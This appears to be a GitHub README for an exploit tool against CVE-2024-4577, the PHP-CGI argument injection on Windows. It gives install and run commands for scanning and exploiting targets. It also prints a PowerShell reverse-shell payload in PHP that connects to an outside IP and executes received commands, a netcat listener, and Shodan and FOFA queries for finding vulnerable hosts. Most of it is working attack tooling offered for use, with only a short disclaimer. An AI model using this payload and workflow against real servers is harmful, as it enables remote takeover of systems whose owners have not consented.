<h1 align="center">
  PHP CGI Argument Injection (CVE-2024-4577) RCE 
</h2>

## 📜 Description 

In PHP versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8, when using Apache and PHP-CGI on Windows, if the system is set up to use certain code pages, Windows may use "Best-Fit" behavior to replace characters in command line given to Win32 API functions. PHP CGI module may misinterpret those characters as PHP options, which may allow a malicious user to pass options to PHP binary being run, and thus reveal the source code of scripts, run arbitrary PHP code on the server, etc.

"XAMPP is vulnerable in a default configuration, and we can target the /php-cgi/php-cgi.exe endpoint. To target
an explloit .php endpoint (e.g. /index.php), the server must be configured to run PHP scripts in CGI mode."
 
## 🛠️ Installation 
```bash
$ git clone https://github.com/fa-rrel/CVE-2024-4577-RCE/
$ cd CVE-2024-4577-RCE && pip install -r requirements.txt 
```
## ⚙️ Usage
$ python3 CVE-2024-4577.py -s -t https://target.com/
## 🤖 Establishing reverse shell 

### PHP Payload
> [!NOTE]
> This tool demonstrates realistic attack and techniques (TTPs). However this specific payload sample does not function in this scenario. Modify the shell.php to obtain fully functional payload.
```php
# rev_shell.php
<?php
$payload = "powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('192.168.56.100', 9001);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\";

exec($payload);
?>
 
```
## 🖥️ Scanning server
```bash
$ python3 CVE-2024-4577.py -s -t https://target.com/                                                   
  ______     _______   ____   ___ ____  _  _         _  _  ____ _____ _____ 
 / ___\ \   / / ____| |___ \ / _ \___ \| || |       | || || ___|___  |___  |
| |    \ \ / /|  _|     __) | | | |__) | || |_ _____| || ||___ \  / /   / / 
| |___  \ V / | |___   / __/| |_| / __/|__   _|_____|__   _|__) |/ /   / /  
 \____|  \_/  |_____| |_____|\___/_____|  |_|          |_||____//_/   /_/    
Author: Ghost_sec | Youtube.com/Ghost_sec | Github.com/fa-rrel | POC & Scanning  

[+] Target https://target.com is vulnerable to CVE-2024-4577
```

## 🎯 Exploiting Vulnerable server
```bash
$ python3 CVE-2024-4577.py -t {targetsite.txt} -e -p rev_shell.php
                                                  
 ______     _______   ____   ___ ____  _  _         _  _  ____ _____ _____ 
 / ___\ \   / / ____| |___ \ / _ \___ \| || |       | || || ___|___  |___  |
| |    \ \ / /|  _|     __) | | | |__) | || |_ _____| || ||___ \  / /   / / 
| |___  \ V / | |___   / __/| |_| / __/|__   _|_____|__   _|__) |/ /   / /  
 \____|  \_/  |_____| |_____|\___/_____|  |_|          |_||____//_/   /_/    
Author: Ghost_sec | Youtube.com/Ghost_sec | Github.com/fa-rrel | POC & Scanning  

[+] Exploit successful!
```

## 👨🏻‍💻 Netcat Listener
```bash
$ nc -lvnp 9001
```

## 🔍 Discovering vulnerable host
- **Shodan**: `server: PHP 8.1`, `server: PHP 8.2`, `server: PHP 8.3`
- **FOFA**: `protocol="http" && header="X-Powered-By: PHP/8.1" || header="X-Powered-By: PHP/8.2" || header="X-Powered-By: PHP/8.3"`
## 💁 References
- https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577
- https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2024/CVE-2024-4577.yaml
- http://www.openwall.com/lists/oss-security/2024/06/07/1
- https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/http/php_cgi_arg_injection_rce_cve_2024_4577.rb
- https://www.php.net/ChangeLog-8.php#8.1.29
- https://www.php.net/ChangeLog-8.php#8.2.20
- https://www.php.net/ChangeLog-8.php#8.3.8
- https://github.com/l0n3m4n/CVE-2024-4577-RCE/

## ⚠️ Disclaimer 
This tool is provided for educational and research purposes only. The creator assumes no responsibility for any misuse or damage caused by the tool.
